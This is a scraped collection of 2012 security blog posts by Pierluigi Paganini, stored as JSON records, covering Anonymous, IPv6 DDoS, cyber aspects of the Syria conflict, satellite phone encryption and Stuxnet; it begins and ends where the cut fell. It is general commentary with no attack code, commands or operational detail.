"https://securityaffairs.co/wordpress/tag/large-scale-infiltration", "topic_name": "Large scale infiltration"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/malware-2", "topic_name": "malware"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/russia", "topic_name": "Russia"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/security-2", "topic_name": "security"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/social-networks-social-network-security-large-scale-infiltration-socialbots-botnets", "topic_name": "Social Networks ; Social Network Security ; Large-scale Infiltration ; Socialbots ; Botnets"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/stuxnet", "topic_name": "stuxnet"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/syria", "topic_name": "Syria"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/threat", "topic_name": "threat"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/us", "topic_name": "US"}]}, {"news_name": "Anonymous, it could become a cyber weapon", "news_link": "https://securityaffairs.co/wordpress/2455/security/anonymous-it-could-become-a-cyber-weapon.html", "title": "Anonymous, it could become a cyber weapon\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "February 10, 2012", "body": "The group of hacktivist known as Anonymous is considered as the uncontrollable variable in the cyber space capable of surprising us with striking operations worthy of the most skilled cyber army.\nPrecisely this is the point, are we sure that the group\u2019s operations are so difficult to control or predict?\n\nAre we able to mitigate the risks of exposure?\n\nWe consider that the group has as its cornerstone the recruitment of common people through social media to engage in protests.\nReflecting well we are facing with a powerful machine that moves, however, announcing his arrival and producing a loud noise.

In a hypothetical phase two does not makes sense to destroy it.

The involvement, of considerable masses could be according specific requirements.\nWhat we really know regarding the genesis of these phenomena that we see just at the sensational climax?\n\nAssumed the possibility of using groups like Anonymous, or rather its model of protest, as a cyber weapon who might be interested in its \u201crecruitment\u201d and what are related risks?\nObviously the idea is very appealing to all governments that tend to conceive cyber definitely aggressive strategies, but that need guarantee a low media exposure. For this reason no doubt exclude government has always openly hostile as Iran, Syria living in the obsession of having to show the world their technical skills. Rule out also governments as Russian and Chinese for two reasons, first for the possibility of using satellite nations like Iran and North Korea for its cyber strategies, second the questionable management of internet, at the edge of censorship, practiced in these countries represents a serious obstacle to the growth and conditioning of movements such as that discussed.\n\nIts obvious that the states in which these groups are more active as the U.S. and Europe might those more interested and motivated in groups hacktivist approach, an approach that would affect cyber operations without having to face the consent of the international community.\nHow to approach the dangerous groups and with what risks? Intelligence operations and study of the phenomenon are preparatory to the approach, but with regard to the possibility of infiltrating the group of course this could be achieved by conditioning, for example through financial compensation and other benefits, the medium and high level representatives of the groups, those people that define the strategies of protest.\nThe risks are related to the negotiation with unstable and mutable organizations that we know too little, but history teaches that such agreements are possible and have occurred in the past such as between states and criminal organizations.\n\nPierluigi Paganini\n\n \n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/anonymous", "topic_name": "Anonymous"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/botnets", "topic_name": "Botnets"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/content-filtering", "topic_name": "Content filtering"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/critical-infrastructures", "topic_name": "Critical infrastructures"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber", "topic_name": "cyber"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-crime", "topic_name": "Cyber Crime"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-weapon", "topic_name": "cyber weapon"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyberwarfare", "topic_name": "cyberwarfare"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/espionage", "topic_name": "Espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/facebook", "topic_name": "Facebook"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/google", "topic_name": "Google"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hackers", "topic_name": "Hackers"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacktivism", "topic_name": "Hacktivism"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacktivists", "topic_name": "hacktivists"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/intelligence", "topic_name": "Intelligence"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/investigation", "topic_name": "Investigation"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/large-scale-infiltration", "topic_name": "Large scale infiltration"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/monitoring-systems", "topic_name": "monitoring systems"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/search-engines", "topic_name": "search engines"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/socia-media", "topic_name": "socia media"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/social-networks-2", "topic_name": "social networks"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/social-networks-social-network-security-large-scale-infiltration-socialbots-botnets", "topic_name": "Social Networks ; Social Network Security ; Large-scale Infiltration ; Socialbots ; Botnets"}]}, {"news_name": "DDoS, IPv6 is an excuse to talk about", "news_link": "https://securityaffairs.co/wordpress/2416/cyber-crime/ddos-ipv6-is-an-excuse-to-talk-about.html", "title": "DDoS, IPv6 is an excuse to talk about\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "February 9, 2012", "body": "The day has come, Network service providers are reporting the first IPV6 distributed denial-of-service (DDoS) attacks and the event is extremly significat from a secutity point of view. The news has been reported in the Arbor Networks\u2019 7th Annual Worldwide Infrastructure Security Report.\n\n\n\nDespite this king of attacks remain relatively rare, the news must alert the world wide community regarding the incoming threat. DDoS attacks have been largerly used during the operations of protest made by several groups of hacktivist during the last years. A phenomena in continuos grow that is difficult to stem, infact experts of the major security firm believe that ideological and political motivations have become the principal motivation behind the DDoS attacks.\n\nThe switchover from the existing address protocol, IPv4, to IPv6 will give to the hackers a great opportunity. With the introduction of the protocol a huge quantity of  new internet addresses is available and those addresses could be used as source for DDoS attack. Attacks based on IPV6 will benefit from switchover due the increased difficulty of identifying and banning the addresses involved in the attacks for which an offender has an availability significantly amplified. Consider also the context in which we operate, migration between protocols is an event to be taken into account and for which companies and governments must be prepared.\n\nThe fact the DDoS attacks on IPv6 are not diffused is a clear indication that the protocol is still not widespread but for sure il will attract increasing attention from cyber criminals and governments.\n\nThere is a strong correlation between the economic significance of a given technology and criminal activity taking advantage of said technology.\n\nLet\u2019s consider also that the IPv6 network traffic may be un-monitored, masking the real threats on IPv6 networks.  Network devices as Firewalls, IPS and Load-Balancer continue to suffer DDoS attacks.\n\nHow to mitigate DDoS attacks?\n\nIt has been expected that for DDoS Attack Mitigation Tools most used will be:\n\n \n\n \n\nDDoS attacks are also used in warfare to conduct cyber operations against enemy governments. Group of hackers are also engaged to attacks sensible targets with the intent make unusable services provided by agencies and institutions.\n\nIt is happened earlier this year, when Israel has been victim of a true escalation in cyberwar, not identified attackers have in fact pulled down two principal national web sites, the Tel Aviv Stock Exchange and El Al, the national airline. The attackers have used a DDoS attack saturating in a short time the resouces of the web sites making sites inaccessible. The situation has been restored within few hours. Unfortunately defend against such attacks is not easy despite the offensive has not come unexpected.\n\nDDoS attacks are even more dangerous when they are used in conjunction with other types of offense. DDoS attacks are used as a diversionary strategy to distract opposing defenses from the real intent of the attackers. Precisely this strategy was occasionally adopted by organized criminals using botnets to paralyzed target defense systems and then proceed undisturbed in the development of fraud.\nThis type of attack as simple in construction are candidated to be therefore among the main cyber threats in the short and medium term and the spread of IPv6 protocol could apply a qualitative leap in the offense capabilities of this dangerous technique of attack.\n\nReferences\n\nhttp://www.itworld.com/security/135495/ddos-attacks-made-worse-firewalls-report-finds\n\n \n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/botnets", "topic_name": "Botnets"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/critical-infrastructures", "topic_name": "Critical infrastructures"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-attacks", "topic_name": "Cyber attacks"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-weapon", "topic_name": "cyber weapon"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/ddos", "topic_name": "DDoS"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hackers", "topic_name": "Hackers"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacktivism", "topic_name": "Hacktivism"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/incident", "topic_name": "Incident"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/internet", "topic_name": "Internet"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/ipv6", "topic_name": "IPv6"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/social-networks-social-network-security-large-scale-infiltration-socialbots-botnets", "topic_name": "Social Networks ; Social Network Security ; Large-scale Infiltration ; Socialbots ; Botnets"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/socialbots", "topic_name": "Socialbots"}]}, {"news_name": "Syria drama and impact on cyberspace", "news_link": "https://securityaffairs.co/wordpress/2350/intelligence/syria-drama-and-impact-on-cyberspace.html", "title": "Syria drama and impact on cyberspace\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "February 7, 2012", "body": "The situation in Syria aroused much concern in the world because it could trigger, in a highly unstable, a conflict that many have tended to avoid. The world, today unarmed, is witnessing a fierce crackdown led by President Bashar al-Assad, a massacre against an opposition that wants the removal of what is considered a dictator regime which granted the permission to kill with impunity. Order executed without hesitation, hundred of protesters killed in the city of Homs, and yesterday At Homs, the bombing started again. Images and videos published on the web and also spread by AFP demonstate that it is bombing civilians. Immediate condemnation from the international community, U.S. in the lead, who expressed profound disagreement with the government of Damascus, who presented a resolution to the UN Security Council. Immediate disconcerting response of Russia and China that have vetoed the same resolution.\n\n\nThe Secretary of State Hillary Clinton has harshly accused who \u201cprevents the world to condemn the violence\u201d and has pointed out against Moscow which \u201ccould not be a constructive dialogue.\u201d There is a real risk that Syria precipitate a civil war.\n\nMade this tragic premise is also appropriate to ask what are the consequences in cyberspace and what balances have been put into question in this scenario.\nWe are learning as a cyber threat is offensive like a military attack and then in a context like the one we are considering would be wrong not to consider a further possible source of attacks.\n\nCyberspace and the real world are closely linked, an unbreakable thin thread, to be analyzed carefully to understand each other\u2019s evolution.\nOn days when the protest was started in Syria an hacker based out of Saudi Arabia named Salman Al Anzi announced to have hacked the private email account of Syrian president Bashar Al Assad containg disturbing revelations. The Hacker threatened to reveal the content of emails and also other information retrieved from other governative email account hacked. According to Al Madina newspaper , the hacker has asked to Bashar Al Assad to stop the massacre immediately and give up power.\n\nIn those email could be documented as well as electoral fraud also received support from the Iranian government in the nation driving.\nThe alliance between Syria and Iran is not a mistery and it has had significant impact in Middle East politics. Cooperation between Syria and India increased after the ouster of Saddam Hussein, their mutual enemy. But the the U.S. military victory also initially raised fears that either Iran or Syria might be the next target in the future U.S. administration.\n\nUnited States and Israel have always been bitter enemies of the two governments and the recent cyber esclation in Middle East is only the last demonstration in order of time. Syria and Iran are the two parties most responsible for spoiling peace efforts between the Arabs and Israel.\n\nThe response to the Soviet resistance to proposed UN sanctions against Damascus is immediately came, Syrian hackers have conducted several operations against central governments infrastructures. Russia is also responsible to willingness to sell weapons to the Syrian government, which has been accused of killing thousands of civilians.\n\nLet\u2019s remember that during the Arab Spring in Syria, the Syrian Electronic Army (SEA), an organization that operates with at least tacit support of the government, claims responsibility for several attacks to those websites that it contends spread news hostile to the Syrian regime. SEA disseminates denial of service (DoS) software designed to target media websites including those of Al Jazeera, BBC News, Syrian satellite broadcaster Orient TV, and Dubai-based al-Arabia TV.\n\nThe Syria has always held in high regard the potential of new media technologies and the failure to manage risks, and the proof is that in Syria on June 3 has used an internet \u201ckill switch\u201d to shut down the country\u2019s Internet network. The country\u2019s 3G, DSL and dial-up were disconnected the same day massive protests.\n\nIn addition to the usual skirmishes between hackers not to be overlooked are the operations of groups of hacktivist which are organizing on the web to retaliate against governments guilty of mass murder and to make decisions to support genocide.\nWe consider that similar movements may have genesis of spontaneous but may also be instigated and supported by agencies wishing to address the dreaded groups against rogue states. Anonymous groups may stand as politically forces against nations such as Russia and China and with what results?\n\nCyberspace is comparable to a stormy sea in which you navigating in sight and where the scenarios are changing rapidly in an unpredictable way by the presence of uncontrolled entities such as groups of hackers and cyber hacktivists in addition to cyber armies set up by the main world powers.\nOther alert signals comes from social media, particularly from social networks who are being attacked by opponents of the regime, but probably also from militants near Damascus.\n\nIt has been observed that percentage of the comments in Arabic, Russian and English that expressed gratitude to Medvedev and Prime Minister Vladimir Putin such as one from user Hamoud Youssef: \u201cA heartfelt thank you to Russia. \u2026 Thank you for the veto.\u201d\nThe comments seems to be posted by syrian users, but the high number of identical entriss suggests that an automated tool has been used for the purpose.\nOnce again the social network monitoring has become an integral part of a cyber strategy led by governments to control the overall sentiment and targeted campaigns of misinformation.\n\nFor which reasons Russia and China opposed the UN?\nMoney is the main motivation for many experts, the same recall that in December Russia agreed to sell 36 Yakovlev-130 trainer-fighter airplanes to the Syrian government in a $550 million contract. The sale is not the sole, it has been documented a continuous flow of weapons between Russia and Syria.\n\nAnother important reason is the consolidation of an axis that opposes to Western policy in the Middle East, Syria is an important bulwark in this sense, a strategic reference that China and Russia do not want to lose.\nThe enemy of my enemy .. is my friend.\n\nPierluigi Paganini\n\nReal Time Update\n\nJust a few seconds after the publication of the post, as good oracle, I have read about\nLulzSec hacks were Syrian security, accounts dumps http://pastebin.com/uaYDfCz0\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/anonymous", "topic_name": "Anonymous"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/botnets", "topic_name": "Botnets"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/china", "topic_name": "China"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyberspace", "topic_name": "cyberspace"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hackers", "topic_name": "Hackers"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacktivism", "topic_name": "Hacktivism"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/iran", "topic_name": "Iran"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/kill-switch", "topic_name": "kill switch"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/russia", "topic_name": "Russia"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/social-media", "topic_name": "social media"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/social-network", "topic_name": "Social Network"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/social-networks-social-network-security-large-scale-infiltration-socialbots-botnets", "topic_name": "Social Networks ; Social Network Security ; Large-scale Infiltration ; Socialbots ; Botnets"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/socialbots", "topic_name": "Socialbots"}]}, {"news_name": "Hacking satellite communications and possible implication", "news_link": "https://securityaffairs.co/wordpress/2317/hacking/hacking-satellite-communications-and-its-implication.html", "title": "Hacking satellite communications and possible implication\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "February 6, 2012", "body": "Once more to worry about is the real security of satellite infrastructures. In a technological civilization satellites play a vital role in the management and transmission of information of all kinds, satellites infact do the work in silent thet we enjoy every day, but often forget this crucial aspect. Are these powerful systems of communication actually safe? Is it sufficient to be in orbit thousands of miles above our heads to ward off all danger of attack? Using Satellite communication are we sure that nobody could listen our communication?\nOf course not! The main concern is the possibility of compromising satellite communications, eventuality that in a context of warfare triggers many fears.\n\n\n\nConsider that the satellite communication are wide used in military application and also in all those region where other communication infrastuctures are insufficient or absent like Middle East and Africa.\n\nSecurity researchers have demonstrated that satellite phones can be easily intercepted and deciphered. You may be asking which powerful media have used the two academics, and the response is terrifying, because the two did not use any special equipment. It \u2018s enough any common computer to hack the two encryption systems used to protect satellite phone signals, anyone with a computer and a radio could eavesdrop on calls,a moltitude of satellite phones are affected. With a few thousand dollars it is possible, according reseachers\u2019s announcement, to buy equipment and software needed to intercept and decrypt satellite phone calls from hundreds of thousands of users.\n\nThe academics have summarized the concept in a single sentence\n\u201cDo not Trust Satellite Phones\u201d\nTo have been compromised are the two main standard encryption algorithms known as GMR-1 and GMR-2 implemented by the nayb satellite phone operators. Actually problem effect only those companies that use the ETSI GMR-1 and GMR-2 encryption algorthms. The speed with which it is possible to decipher a call is linked to the computing power, but we keep in mind that is possible with a suitable equipment decipher the communication in real time.\n\nThe two researchers are convinced that the main problems related to the algorithms is the \u201csecurity through obscurity\u201d approach followed attempting to use secrecy of design or implementation to provide security and preventing the science communitity to test them. Publishing the hacking procedure the academics desire to prompt ETSI organization to sets the new standards based on stronger and public algorithms. It had happened in the past to GSM communications, an approach targeted to hide the algorithms used for encrypting communications is certainly wrong and represents a risk to the integrity of the overall infrastructure.\n\nDue to this incorrect approach in the management of the algorithms many organisations have implemented extra layers of cipher software in their satellite phones with the result of increasing its vulnerability. Consequence of the announcement is that satellite handsets with built in encryption mechanisms based on the hacked algorithms are no longer secure, which could pose a considerable threat to business and military sectors. Hostile governments and also criminals will be able to monitor satellite phone networks on a large scale.\n\nIf the situation regarding satellite encryption algorithms is worrying certainly the security of satellites themselves is not better.\n\nA report released in 2011 named titled the \u201c2011 Report to Congress of the U.S.-China Economic and Security Review Commission\u201d reveals that some US operated satellites are vulnerable to attacks and in more than one occasion attackers taken control of the systems, sensitive satellite systems have been successfully breached.\n\n\u201cSatellites from several U.S. government space programs utilize commercially operated satellite ground stations outside the United States, some of which rely on the public Internet for \u2018data access and file transfers,\u2019 according to a 2008 National Aeronautics and Space Administration quarterly report.\u2020 The use of the Internet to perform certain communications functions presents potential opportunities for malicious actors to gain access to restricted networks,\u201d \n\nInformation regarding several attacks to satellite control systems are of public domain , and these events have been confirmed also by The National Aeronautics and Space Administration. Below is a brief list of events:\n\nIn the report the responsability of the attacks has been assigned to China but similar hack can be conducted by every hostile foreign government.\nWe must consider that compromising satellites is a serious risk, the expousure could affect communication in business and military sectors and also can causes the theft of sensible and strategic technological information.\n\nMy last consideration is related to threats to satellite systems. In our imagination we make the mistake of considering only as possible sources of attacks foreign governments. The proof that this view is wrong has arrived in recent weeks when the group Anonymous has announced that it has successfully hacked a NASA satellite, the group has also  published on Pastebin evidence of knowledge on NASA project.\n\nClearly the situation merits a high level of attention given the looming threat.\n\nPierluigi Paganini\n\nReferences\n\nhttp://infosecisland.com/blogview/18279-Malicious-Cyber-Activities-Directed-Against-US-Satellites.html\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/anonymous", "topic_name": "Anonymous"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/china", "topic_name": "China"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/critical-infrastructures", "topic_name": "Critical infrastructures"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber", "topic_name": "cyber"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-crime", "topic_name": "Cyber Crime"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-threats", "topic_name": "cyber threats"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cybersecurity", "topic_name": "Cybersecurity"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyberwarfare", "topic_name": "cyberwarfare"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hackers", "topic_name": "Hackers"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacktivism", "topic_name": "Hacktivism"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/intelligence", "topic_name": "Intelligence"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/large-scale-infiltration", "topic_name": "Large scale infiltration"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/nasa", "topic_name": "NASA"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/sabotage", "topic_name": "Sabotage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/satellite", "topic_name": "Satellite"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/warfare", "topic_name": "warfare"}]}, {"news_name": "Underestimate the threat, a serious error", "news_link": "https://securityaffairs.co/wordpress/2278/cyber-crime/underestimate-the-threat-a-serious-error.html", "title": "Underestimate the threat, a serious error\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "February 4, 2012", "body": "In recent years it has fully understood the offensive capability of the use of cyber weapons, highly efficient tools to move attacks and espionage operations in total coverage.\nThe effectiveness of the cyber threat is linked not only to its intrinsic characteristics, but also to the choice of channel for its spread and in this social media represent a privileged factor.

No matter if it is related to an attack by hostile government or by citizens disgruntled political decisions, the result is the same and we must implement measures to contain them.\n\nWhich is the level of preparedness of the major nations in the world against the cyber threats?\n\nIsrael, Finland and Sweden are the most prepared nations in terms of cyber defenses, meanwhile with great surprise those countries with most aggressive cyber strategy, like India, Iran and China, are facing with serious difficulties, according to a McAfee. Consider that nations like Israel undergo an impressive number of cyber attacks, an approximate estimation is around 1000 attacks every minute.\n\n\nA good rank depends on several factors like the implementation of technological countermeasures (e.g firewalls, end point protection systems) and more complex matters including well-informed governance and education. To fight the threat is essential first of all a solid co operation between Governments and private sector, which effectively controls about 80% of the critical national infrastructure. The private sector is extremely vulnerable to cyber attacks and hold much of the intellectual property of the main countries.\n\nRussia and China are the nations responsible for the major number of attacks moved to steal foreign intellectual property, trade secrets and national security information, that is the new frontier of espionage. From cyber security perspective we observed  an exponential grow of the threats, consider that every day more than 60,000 new malware are identified and with the same trend of growth we recorded continuous attacks of hacking groups to the main structures of a nation like the U.S..\n\nTracking back to origin of those malware we have found that control servers are often located in China and the intrusion mainly target firms in the defense industry, Sykipot agent is a good case study. What I personally care most is the organizational capacity of groups of hackers and criminal organizations that use increasingly advanced technologies on which they dedicate a continued focus in bringing about improvements.\n\nRelating governmental cyber threats which are mainly active countries?\nResearchers are convinced US and China are the most active because they are by far the most popular starting points for cyber attacks.\nAccording a report of the Security firm NCC Group the US accounted for 22 per cent of all the world\u2019s cyber attacks, while China was second with a 16 per cent share.\nNCC estimates that the combined hacking attempts originating from the two countries hit the global economy by roughly $44 billions.\nRussia was at third place with a responsibility for 3.6 per cent of attacks and a cost of roughly $4billion in damages, followed by Brazil with 3.5 per cent and Italy with 3.1 per cent of the world\u2019s hacking activity. The impact on the the global economy it is therefore the object of considerable attention by the major security firms, cybersecurity market is rapidly growing.\n\nWe have often discussed the crime industry that operates following processes well defined and pursuing quality objectives as any big companies. During the last couple of year we had a long list of cyber attacks more of them really striking like the data breach of RSA and Symantec companies.\n\nDuring the last couple of years we had a long list of cyber attacks really striking like the data breach of RSA and Symantec companies, don\u2019t forget also the operations made by the Anonymous groups like the intrusion and the data breach in the systems of cyber-security firm HB Gary with more af 50,000 emails were exposed.\nRegarding the cyber security there is an open debate on global scale, cyber threats have no countries, have no names, are an invisible enemy that could be dammed only with cooperation and awareness of entire populations.\n\nPierluigi Paganini\n\nReferences\n\nhttp://www.securitydefenceagenda.org/Contentnavigation/Library/Libraryoverview/tabid/1299/articleType/ArticleView/articleId/3063/New-SDA-report-Cybersecurity-The-vexed-question-of-global-rules.aspx\n\nhttp://www.cyberhub.com/CyberPowerIndex\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/anonymous", "topic_name": "Anonymous"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/china", "topic_name": "China"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/critical-infrastructures", "topic_name": "Critical infrastructures"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-crime", "topic_name": "Cyber Crime"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-threats", "topic_name": "cyber threats"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-weapon", "topic_name": "cyber weapon"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyberwarfare", "topic_name": "cyberwarfare"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/espionage", "topic_name": "Espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hackers", "topic_name": "Hackers"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacktivism", "topic_name": "Hacktivism"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/incident", "topic_name": "Incident"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/india", "topic_name": "India"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/intelligence", "topic_name": "Intelligence"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/internet", "topic_name": "Internet"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/large-scale-infiltration", "topic_name": "Large scale infiltration"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/malware-2", "topic_name": "malware"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/offense", "topic_name": "offense"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/russia", "topic_name": "Russia"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/sabotage", "topic_name": "Sabotage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/social-networks-social-network-security-large-scale-infiltration-socialbots-botnets", "topic_name": "Social Networks ; Social Network Security ; Large-scale Infiltration ; Socialbots ; Botnets"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/stuxnet", "topic_name": "stuxnet"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/trojan", "topic_name": "Trojan"}]}, {"news_name": "Stuxnet, are we really safe now?

No, of course!\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "January 31, 2012", "body": "Once again I draw inspiration from the argument \u201cStuxnet\u201d on which much is being read on the web at this time, and a lot of which will be discussed in the years to come. From all the scientists Stuxnet was defined a deadly weapon, but why  if any direct damages recorded are comparable to those of other malware?\nThe answer to the question is in the nature of the malware that has been designed with a detailed analysis of final target environment. Behind Stuxnet is apparent that a meticulous intelligence work that for the first time in history has embraced the world of information technology in the design of what is considered the first real cyber weapon.\n\n\n\nNo one dares to speculate on the paternity of the agent but it is clear that it was designed with the intent to strike the Iranian nuclear program and even more clear is who has always opposed such a program, U.S. and Israel first, and consider also the the tecnology skill necessary to develope a weapon with the observed architecture is really high.\n\nPersonaly I find extremely important two factors af the event:\n\nThe first factor leads to an important consideration, those who developed Stuxnet have long known of the vulnerabilities of industrial control systems, aspect which the whole world has become aware only after the event. Today we count how many SCADA systems are exposed in internet, an infinity vulnerable because many of them badly configured or due design flaws. The control systems are the Achilles heel of the strategic plants with invulnerable perimeter security, they rapresent an open a door that only the insiders know. Not only that, with Stuxnet has been provided evidence of deep knowledge of the systems present in the target nuclear plant as a demonstration of a meticulous intelligence action that has left no stone unturned, even the photos published on the occasion of the visit of President Achmainejad some nuclear sites.\n\nRegarding the second point, it has been discovered a platform behind Stuxnet called \u201cTilded Platform\u201c, used also for the development of Duqu malware, and that make possible the development of a set of reusable tools, a true innovation that make possible the composition of ever new and enhanced agents with modules developed to fulfill specific functions against clearly defined targets.\n\nOther aspects are not negligible are the public autopsy made of the Stuxnet by researches all over the word that have opened the mind on a new topic, development of a cyber weapon with those specific features. Security professionals now have a much clearer idea of how this kind of cyber weapon works and this open to dangerous future scenarios. The victims it selfs for sure will work in the same way to attacks western facilities, are we ready to prevent this kind of offensive? Let me say not yet, I speak from Italy a nation that is facing with serious economic problems like other European Countries.\nThe Enisa Organizzation have proposed several guidelines but we are far from implement them, we are exposed to a big threat.\n\nAccording to several interviews an intervents of the security specialist Ralph Lagner, considered the father of the Stuxnet experts, we are under attack, we have no idea of the potentiality of those agent that teorically could remain in stealt mode inside the target avoiding security systems for several years, gathering information and preparing the final attack.\n\nThis type of attacks is usually moved over a long period of months under coverage to avoid that the malware\u2019s activity is noticed. We need to improve forensics techiniques to identify the threats and eradicate it, today major installations and critical infrastructure really are not prepared, that it the thought of Lagner. Lagner is convinced that we presently don\u2019t have Intrusion detection system (IDS) that are able to detect the malware. We are fighting with an invisible enemy and we are so from a technology point of view to have a final solution to the problem, a product that would be capable of doing this. Another aspect not to overlook is the belief that the control systems of the major manufacturers, common in every industry sector,are absolutely secure. This belief, and the lack of information about risks associated with their use, is the basis of lack of awareness of the threat. Lagner argues that a more humble and collaborative approach of companies like Siemens would no doubt help to combat the threat more effectively.  Contrary to much of the public reporting on Stuxnet, however, Langner said that the worm was not designed to destroy the Natanz facility, but rather to secretly and stealthily control the process and steer it into a virtual ditch.\n\nThe analysis conducted the exper Lagner have revealed that we are facing with an incredible deep understanding of the functioning of the Siemens Simatic software and the centrifuges that the Iranians relied on.  The fampus expert said :\n\n<<These guys know the centrifuges better than the Iranians,\u201d Langner said of the Stuxnet authors. \u201cThe know everything. They know the timing, they known the inputs, and they know it by heart.\u201d>>\n\nThe Suxnet\u2019s authors havent used a so sophisticated hack but they simply took advantage of a discutible design decision made by Siemens to make the controller input process image read-write instead of read only allowing to store record process input and execute them using PLC controller interface. This opportunity must alert the entire industry community on the vulnerability because those control systems are vulnerable due design flaws.\n\nIn conclusion we can raise serious doubts on the immediate effectiveness of preventive measures against this new generation of cyber weapons because the industry in general is still too vulnerable. Possible evolutions of malware could cause serious damage to infrastructures that use the systems in question.\n\nThe only way to emerge unscathed from this awkward situation is a close collaboration between industry, leading 